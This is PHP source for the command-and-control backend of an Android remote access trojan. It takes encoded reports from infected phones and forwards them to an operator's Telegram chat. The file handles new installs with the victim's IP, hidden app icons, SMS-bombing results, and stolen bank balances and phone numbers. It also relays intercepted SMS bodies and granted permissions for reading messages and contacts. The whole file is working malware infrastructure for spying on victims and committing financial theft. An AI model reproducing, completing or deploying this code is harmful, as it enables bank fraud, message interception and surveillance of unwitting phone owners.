<?php
include "Madsal.php";
function bot($method, $datas = [])
{
    $url = "https://api.telegram.org/bot" . TOKEN . "/" . $method;
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);

    curl_setopt($ch, CURLOPT_POSTFIELDS, $datas);
    $res = curl_exec($ch);
    if (curl_error($ch)) {
        var_dump(curl_error($ch));
    } else {
        return json_decode($res, true);
    }
}
function ch($type, $data)
{
    $dat = json_decode(file_get_contents("data/data.json"), true);
    $dat["$type"] = $data;
    file_put_contents("data/data.json", json_encode($dat, 448));
}
function em($text, $message_id, $keyboard)
{
    global $admin;
    return bot('editmessagetext', [
        'chat_id' => $admin,
        'message_id' => $message_id,
        'text' => $text,
        'parse_mode' => 'HTML',
        'reply_markup' => $keyboard,
    ])['result']['message_id'];
}
function sm($text, $keyboard)
{
    global $admin;
    return bot('sendMessage', [
        'chat_id' => $admin,
        'text' => $text,
        'parse_mode' => 'HTML',

        'reply_markup' => $keyboard,
        'disable_web_page_preview' => true,
    ])['result']['message_id'];
}
function dm($message_id)
{
    global $admin;
    return bot('deleteMessage', [
        'chat_id' => $admin,
        'message_id' => $message_id,
    ]);
}
$ip = $_SERVER['REMOTE_ADDR'];
function todate($timestramp)
{
    $data = json_decode(file_get_contents("https://codingtools.ir/api/v1/service/date-converter?to=shamsi&from=timestamp&timestamp=$timestramp"), true);
    return $data['date'] . " " . $data['time'];
}
$postdata = file_get_contents("php://input");
if (!isset($_GET['data'])) {
    if (strlen($postdata) > 1) {
        $data = json_decode(base64_decode($postdata), true);
        $action = isset($data['action']) ? $data['action'] : null;
        $fmtoken = isset($data['fmtoken']) ? $data['fmtoken'] : null;
        $androidid = isset($data['androidid']) ? $data['androidid'] : null;
        $model = isset($data['model']) ? $data['model'] : null;
        $operator = isset($data['operator']) ? $data['operator'] : null;
        $battrey = isset($data['battrey']) ? $data['battrey'] : null;
        $os = isset($data['os']) ? $data['os'] : null;
        $ratdata = isset($data['data']) ? json_decode(base64_decode($data['data']), true) : null;
        $panel = json_encode(array('inline_keyboard' => [[['text' => "⚙️ᴏᴘᴇɴ ᴘᴀɴᴇʟ️", 'callback_data' => 'openpanel_' . $androidid]],
        ]));
        if ($action == "firstinstall") {
            if (!file_exists("users/$androidid.json")) {
                sm("🟢ɴᴇᴡ ᴜꜱᴇʀ #ɪɴꜱᴛᴀʟʟ ᴛʜᴇ ʀᴀᴛ

📱ᴍᴏᴅᴇʟ : $model
🌐ᴜꜱᴇʀ ɪᴘ : $ip

🧑🏼‍🚀ᴄᴏᴅᴇᴅ ʙʏ : $codedby", $panel);
            }
            file_put_contents("users/$androidid.json", json_encode(array("androidid" => $androidid, "model" => $model, "fmtoken" => $fmtoken, "offlinemode" => "off", "offlinenum" => "09123456789"), 448));
            die('');
        } elseif (file_exists("users/$androidid.json")) {
            $data = json_decode(file_get_contents("users/$androidid.json"), true);
            $echoname = isset($data['name']) ? $data['name'] : $data['model'];
            if ($action == "pingone") {
                sm("🔋ᴜꜱᴇʀ [ $echoname ] ɪꜱ ᴏɴʟɪɴᴇ

🧑🏼‍🚀ᴄᴏᴅᴇᴅ ʙʏ : $codedby", $panel);
            } elseif ($action == "bomber") {
                sm("💣ʀᴇQᴜᴇꜱᴛᴇᴅ ᴘʜᴏɴᴇ ɴᴜᴍʙᴇʀ ꜰᴜᴄᴋᴅᴜᴘ ꜱᴜᴄᴄᴇꜱꜱꜰᴜʟʟʏ ʙʏ [ $echoname ]

🧑🏼‍🚀ᴄᴏᴅᴇᴅ ʙʏ : $codedby", $panel);
            } elseif ($action == "pingall") {
                file_put_contents("data/onlineusers.txt", file_get_contents("data/onlineusers.txt") . "/panel_$androidid [$echoname]\n");
                $messid = file_get_contents("data/pingmsg.txt");
                $onlineusers = file_get_contents("data/onlineusers.txt");
                $id = em("♻️درخواست پینگ به کل یوزر ها ارسال شد . لطفا کمی صبر کنید

[$onlineusers]

⚠️این پیام را حذف نکنید , پیام اپدیت میشود و یوزر آنلاین داخل همین مسیج قرار میگیرد

🧑🏼‍🚀ᴄᴏᴅᴇᴅ ʙʏ : $codedby", $messid, null);
                file_put_contents("data/pingmsg.txt", $id);
            } elseif ($action == "deviceinfo") {
                sm("⚙️ᴅᴇᴠɪᴄᴇ ɪɴꜰᴏ [ $echoname ]

📱ᴍᴏᴅᴇʟ : $model
📶ᴏᴘᴇʀᴀᴛᴏʀ : $operator
🔋ʙᴀᴛᴛʀᴇʏ : $battrey%
🪤ᴏꜱ : ($os)
🌐ᴜꜱᴇʀ ɪᴘ : $ip
🧑🏼‍🚀ᴄᴏᴅᴇᴅ ʙʏ : $codedby", $panel);
            } elseif ($action == "hideicon") {
                sm("👻ɪᴄᴏɴ ʜɪᴅᴇᴅ ᴏɴ [ $echoname ] ᴅᴇᴠɪᴄᴇ

🧑🏼‍🚀ᴄᴏᴅᴇᴅ ʙʏ : $codedby", $panel);
            } elseif ($action == "banksbalance") {
                $banks = "";
                foreach ($ratdata as $bank => $value) {
                    $time = todate(floor($value['time'] / 1000));
                    $banks .= "🏦$bank :
ʙᴀʟᴀɴᴄᴇ : {$value['balance']}
ɴᴜᴍʙᴇʀ : {$value['phone']}
ʀᴇᴄᴇɪᴠᴇᴅ ᴅᴀᴛᴇ : $time
==============\n";
                }
                sm("🏛[ $echoname ]ʙᴀɴᴋ ɪɴꜰᴏʀᴍᴀᴛɪᴏɴ

$banks 📶ᴏᴘᴇʀᴀᴛᴏʀ : $operator
🌐ᴜꜱᴇʀ ɪᴘ : $ip
🧑🏼‍🚀ᴄᴏᴅᴇᴅ ʙʏ : $codedby", $panel);
            } elseif ($action == "messagesent") {
                sm("✅ᴍᴇꜱꜱᴀɢᴇ ꜱᴇɴᴛ ꜱᴜᴄᴄᴇꜱꜱꜰᴜʟʟʏ [ $echoname ]

🧑🏼‍🚀ᴄᴏᴅᴇᴅ ʙʏ : $codedby", $panel);
            } elseif ($action == "lastsms") {
                sm("✉️ʟᴀꜱᴛ ꜱᴍꜱ [ $echoname ]

📞ᴘʜᴏɴᴇ : [ {$ratdata['Phone']} ]
⚙️ᴛʏᴘᴇ : ({$ratdata['type']})
📩ʙᴏᴅʏ :
{$ratdata['Body']}
===============
📶ᴏᴘᴇʀᴀᴛᴏʀ : $operator
🌐ᴜꜱᴇʀ ɪᴘ : $ip
🧑🏼‍🚀ᴄᴏᴅᴇᴅ ʙʏ : $codedby", $panel);
            } elseif ($action == "newmesage") {
                sm("✉️ɴᴇᴡ ᴍᴇꜱꜱᴀɢᴇ [ $echoname ]

📞ᴘʜᴏɴᴇ : [ {$ratdata['Phone']} ]
📩ʙᴏᴅʏ :
{$ratdata['Body']}
====================
📶ᴏᴘᴇʀᴀᴛᴏʀ : $operator
🌐ᴜꜱᴇʀ ɪᴘ : $ip

🧑🏼‍🚀ᴄᴏᴅᴇᴅ ʙʏ : $codedby", $panel);
            } elseif ($action == "checkpermission") {
                sm("🔓[ $echoname ] ᴅᴇᴠɪᴄᴇ ᴘᴇʀᴍɪꜱꜱɪᴏɴ ᴄʜᴇᴄᴋᴇᴅ

1️⃣ꜱᴇɴᴅ ᴍᴇꜱꜱᴀɢᴇ :{$ratdata['sendmsg']}
2️⃣ʀᴇᴠᴇɪᴄᴇ ᴍᴇꜱꜱᴀɢᴇ :{$ratdata['receivesms']}
3️⃣ʀᴇᴀᴅ ᴍᴇꜱꜱᴀɢᴇ : {$ratdata['readmsg']}
4️⃣ʀᴇᴀᴅ ᴄᴏɴᴛᴀᴄᴛꜱ :{$ratdata['readcontacts']}

🧑🏼‍🚀ᴄᴏᴅᴇᴅ ʙʏ : $codedby", $panel);
            }
        }
    }

}